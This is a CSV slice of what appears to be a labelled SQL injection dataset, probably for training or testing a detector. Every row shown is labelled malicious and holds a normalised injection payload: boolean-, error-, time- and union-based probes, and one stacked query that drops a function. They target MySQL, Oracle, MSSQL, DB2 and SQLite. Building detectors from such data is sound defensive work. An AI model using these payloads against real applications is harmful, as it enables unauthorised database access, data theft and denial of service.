row_index,payload_norm,label,sqli_type_hint
2610,"1"" ) and elt ( 4249 = 4249,7259 ) and ( ""upkx"" = ""upkx",1,
2611,-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 5616 = 5616,1,
2612,if ( 9953 = 4347 ) select 9953 else drop function ocau--,1,
2613,"1' ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'vcph' = 'vcph",1,
2614,"1'|| ( select 'zifu' from dual where 4822 = 4822 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
2615,"-9699"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""dufs"" = ""dufs",1,
2616,"1' where 1917 = 1917 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
2617,"1 ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( 9270 = 9270",1,
2618,1' and 9970 = 3409,1,
2619,"1"" where 8697 = 8697 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
2620,1 rlike ( select ( case when ( 6795 = 5898 ) then 1 else 0x28 end ) ) -- xdkx,1,
2621,"1 ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",1,
2622,"1%"" ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""%"" = """,1,
2623,"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'jhle' like 'jhle",1,
2624,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'rspz' = 'rspz",1,
2625,"1"" ) ) ) union all select null,null,null,null,null,null,null,null#",1,
2626,"1'|| ( select 'ejuu' from dual where 2903 = 2903 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) ||'",1,
2627,"1'|| ( select 'lije' from dual where 5309 = 5309 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",1,
2628,1 ) where 2390 = 2390,1,
2629,waitfor delay '0:0:5'-- thuo,1,
2630,"-2929"" ) ) ) union all select 8999,8999#",1,
2631,1' ) where 5378 = 5378,1,
2632,"1"" and ( 3020 = 3020 ) *6703",1,
2633,"1"" ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
2634,1 ) where 8320 = 8320 waitfor delay '0:0:5'--,1,
2635,"1%"" ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""%"" = """,1,
2636,"1 ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 2868 = 2868",1,
2637,"1%' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and '%' = '",1,
2638,"-5313"" ) ) ) union all select 9189,9189,9189,9189,9189,9189,9189,9189--",1,
2639,"1'|| ( select 'setd' from dual where 3686 = 3686 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) ||'",1,
